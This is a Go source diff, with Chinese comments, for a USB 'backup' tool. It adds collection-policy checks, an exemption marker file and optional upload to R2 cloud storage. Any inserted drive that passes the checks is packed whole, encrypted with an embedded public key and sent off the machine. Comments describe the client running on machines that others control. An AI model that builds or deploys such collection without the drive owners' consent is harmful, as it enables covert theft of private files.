@@ -1,19 +1,27 @@
 // Package backup 是流水线编排层，把各模块串成一条作业链。
 //
-// 状态：**已完整实现**（产物命名与审计见本文件，流水线见 pipeline.go，保留策略见 retention.go）。
+// 状态：**已完整实现**（产物命名与审计见本文件，流水线见 pipeline.go，
+// 上传见 upload.go，保留策略见 retention.go）。
 //
-// 对应需求 F-801 ~ F-809。
+// 对应需求 F-801 ~ F-809 与 F-H01 ~ F-H03。
 //
 // 分支判定：
 //
-//	插入事件 → 就绪等待 → 卷类型检查 → 关键检测（keyfile.Scan）
-//	    ├─ authorized = true  → 分支 A：回写本地备份到 <USB>:\backup\   （copier）
-//	    └─ authorized = false → 容量门控（winvol.EvaluateGate）
-//	                              ├─ used > 阈值 → 跳过
-//	                              └─ 否则        → 分支 B：整盘打包 + 混合加密（archive + crypto）
+//	插入事件 → 就绪等待 → 卷类型检查
+//	    ├─ 盘根命中授权标记(.usbbackup-allow) → 豁免，直接跳过（不读盘、不打包）
+//	    └─ 未豁免 → 采集策略判定（collectpolicy.Decide）
+//	          ├─ off / marker_only 未命中 → 跳过
+//	          └─ 通过 → 容量门控（winvol.EvaluateGate）
+//	                ├─ used > 阈值 → 跳过
+//	                └─ 否则 → 整盘打包 + 混合加密（archive + crypto）
+//	                        → 上传 R2（可选，见 upload.go）
+//	                        → 按配置保留/清理本地密文
 //
-// 审计约束（G-02）：审计记录**只包含**盘符、卷标、容量、分支、布尔判定与计数，
-// 绝不包含私钥内容、私钥文件名、文件清单或任何文件内容。
+// 全程对源介质**只读**：不写入、不删除、不改名源盘上任何对象（G-05）。
+// 唯一的写动作落在本机 OutputDir 与远端 R2 上。
+//
+// 审计约束（G-02 / F-G02）：审计记录**只包含**盘符、卷标、容量、分支、
+// 布尔判定与计数，绝不包含文件清单、文件名或任何文件内容。
 package backup
 
 import (
@@ -28,11 +36,10 @@ import (
 	"time"
 
 	"github.com/immml/UsbBackUP-R2/internal/archive"
+	"github.com/immml/UsbBackUP-R2/internal/collectpolicy"
 	"github.com/immml/UsbBackUP-R2/internal/config"
-	"github.com/immml/UsbBackUP-R2/internal/copier"
 	"github.com/immml/UsbBackUP-R2/internal/crypto"
 	"github.com/immml/UsbBackUP-R2/internal/fsutil"
-	"github.com/immml/UsbBackUP-R2/internal/keyfile"
 	"github.com/immml/UsbBackUP-R2/internal/winvol"
 )
 
@@ -41,53 +48,53 @@ type Branch string
 
 // 分支常量。
 const (
-	// BranchAuthorized 表示检测到私钥，执行本地备份回写。
-	BranchAuthorized Branch = "authorized-writeback"
-	// BranchArchive 表示未检测到私钥，执行整盘打包加密。
+	// BranchArchive 表示通过全部准入判定，执行整盘打包加密（并按配置上传）。
 	BranchArchive Branch = "archive-encrypt"
-	// BranchSkipped 表示因门控或异常而跳过。
+	// BranchSkipped 表示因准入判定或门控而跳过。
 	BranchSkipped Branch = "skipped"
 	// BranchFailed 表示作业失败。
 	BranchFailed Branch = "failed"
 )
 
-// 门控跳过原因（写入审计，便于事后复盘）。
+// 跳过原因（写入审计，便于事后复盘）。
+//
+// 容量门控相关的几个（used-over-threshold / max-total-exceeded / volume-not-ready）
+// **不在此处定义**：它们由 winvol.EvaluateGate 直接给出稳定码，见 winvol.PolicyCode*。
+// 原因见那里的注释——两个阈值语义不同，混用一个码会让复盘时不知道该调哪个配置项。
 const (
-	// SkipReasonOverThreshold 表示已占用容量超过阈值（F-304）。
-	SkipReasonOverThreshold = "used-over-threshold"
 	// SkipReasonNotRemovable 表示不是可移动卷（F-301）。
 	SkipReasonNotRemovable = "not-removable"
 	// SkipReasonNotReady 表示卷未就绪（F-305）。
 	SkipReasonNotReady = "volume-not-ready"
-	// SkipReasonNoKeyOnTarget 表示分支 A 的目标卷无授权。
-	SkipReasonNoKeyOnTarget = "no-key-and-gate-skip"
+	// SkipReasonExemptMarker 表示盘根有授权标记，本次豁免（F-G03′）。
+	SkipReasonExemptMarker = "exempt-marker"
+	// SkipReasonCollectDisabled 表示采集策略为 off。
+	SkipReasonCollectDisabled = "collect-disabled"
+	// SkipReasonNoCollectMarker 表示 marker_only 档位下未找到采集标记。
+	SkipReasonNoCollectMarker = "no-collect-marker"
 )
 
 // Deps 是流水线依赖。
 type Deps struct {
 	Cfg *config.Config
 	Log *slog.Logger
-	// Matcher 是私钥判定器（由 keyfile.NewMatcher 构造）。为 nil 时按"未授权"处理。
-	Matcher *keyfile.Matcher
-	// AllowedFingerprint 是已配置公钥的指纹，用于显式授权标记判定（F-203）。
-	AllowedFingerprint string
 	// AllowFixed 允许对固定磁盘执行作业。
 	// **仅供验证与排障**（本机没有可移动介质时用来跑通链路），生产环境应保持 false。
 	AllowFixed bool
-	// DryRun 只做检测与门控判定，不写入任何数据。
+	// DryRun 只做检测与门控判定，不写入任何数据、不发起任何网络请求。
 	DryRun bool
-	// CopyOverwrite 允许回写时覆盖目标同名文件（默认跳过，F-403）。
-	CopyOverwrite bool
-	// CopyVerifyHash 回写后按 SHA-256 逐文件校验（默认只比大小，F-407）。
-	CopyVerifyHash bool
-	// CopyMaxFiles 是回写条目数上限，0 表示用内置默认。
-	CopyMaxFiles int
 	// EmbeddedPublicKey 是客户端模式下**内嵌在可执行文件里**的公钥。
 	//
 	// 非空时优先于 cfg.PublicKeyPath：客户端运行在他人可控的机器上，
 	// 不能依赖外部公钥文件（文件可能被替换、删除或指向攻击者的公钥）。
 	// 这只是一把公钥，内嵌不构成泄露（G-01）。
 	EmbeddedPublicKey *rsa.PublicKey
+	// CredentialPath 覆盖凭据文件位置；为空时按 resolveCredentialPath 解析。
+	CredentialPath string
+	// Uploader 覆盖上传实现（联调与测试注入）。为 nil 时按配置构造 r2 客户端。
+	Uploader Uploader
+	// UploadPrefix 覆盖对象键前缀；为空时用凭据里的前缀。
+	UploadPrefix string
 }
 
 // AuditRecord 是写入 audit.jsonl 的一行。
@@ -105,20 +112,35 @@ type AuditRecord struct {
 	FreeBytes    int64  `json:"free_bytes"`
 	UsedBytes    int64  `json:"used_bytes"`
 	Branch       Branch `json:"branch"`
-	// HasKeyfile 只记录布尔值与计数，不记录命中文件名（G-02）。
-	HasKeyfile    bool     `json:"has_keyfile"`
-	KeyfileHits   int      `json:"keyfile_hits"`
-	KeyfileKinds  []string `json:"keyfile_kinds,omitempty"`
-	ScannedFiles  int      `json:"scanned_files"`
-	DetectSeconds float64  `json:"detect_seconds"`
+
+	// ---- 采集准入（F-G02 / F-H03）----
+	//
+	// 全部是布尔值与档位名，不含文件名、不含标记内容。
+	CollectPolicy  string `json:"collect_policy,omitempty"`
+	Collected      bool   `json:"collected"`
+	ExemptMarker   bool   `json:"exempt_marker"`
+	CollectMarker  bool   `json:"collect_marker,omitempty"`
+	CollectSkipped string `json:"collect_skip_reason,omitempty"`
+
 	// SkipReason 仅在跳过时有值。
 	SkipReason string `json:"skip_reason,omitempty"`
 	// Product 是产物相对文件名（只含净化后的卷标与扩展名，不含完整路径）。
 	Product string `json:"product,omitempty"`
-	// Files / RawBytes / CipherBytes 是打包或复制的统计。
-	Files       int     `json:"files,omitempty"`
-	RawBytes    int64   `json:"raw_bytes,omitempty"`
-	CipherBytes int64   `json:"cipher_bytes,omitempty"`
+	// Files / RawBytes / CipherBytes 是打包统计。
+	Files       int   `json:"files,omitempty"`
+	RawBytes    int64 `json:"raw_bytes,omitempty"`
+	CipherBytes int64 `json:"cipher_bytes,omitempty"`
+
+	// ---- 上传（F-H03）----
+	// 不含 token、不含签名头、不含 URL query。
+	R2ObjectKey   string `json:"r2_object_key,omitempty"`
+	R2Bucket      string `json:"r2_bucket,omitempty"`
+	UploadedBytes int64  `json:"uploaded_bytes,omitempty"`
+	UploadResult  string `json:"upload_result,omitempty"`
+	UploadErr     string `json:"upload_error,omitempty"`
+	// LocalProduct 说明本地产物最后的去向。
+	LocalProduct string `json:"local_product,omitempty"`
+
 	OK          bool    `json:"ok"`
 	Err         string  `json:"error,omitempty"`
 	DurationSec float64 `json:"duration_sec,omitempty"`
@@ -189,19 +211,19 @@ type Result struct {
 	Volume     winvol.Volume
 	Branch     Branch
 	SkipReason string
-	Authorized bool
-	Detect     keyfile.Result
-	Gate       winvol.Policy
-	// ProductPath 是产物绝对路径（分支 B）。
+	// Collect 是采集准入判定的结论（含豁免与标记命中情况）。
+	Collect collectpolicy.Decision
+	Gate    winvol.Policy
+	// ProductPath 是产物绝对路径。
 	ProductPath string
-	// Copy 是分支 A 的复制统计。
-	Copy *copier.Stats
-	// Zip 是分支 B 的打包统计。
+	// Zip 是打包统计。
 	Zip archive.ZipStats
-	// Encrypt 是分支 B 的加密统计。
+	// Encrypt 是加密统计。
 	Encrypt crypto.EncryptSummary
-	OK      bool
-	Err     string
+	// Upload 是上传结果；未开启上传时 Attempted 为 false。
+	Upload UploadResult
+	OK     bool
+	Err    string
 	// Duration 是本次作业耗时。
 	Duration time.Duration
 }
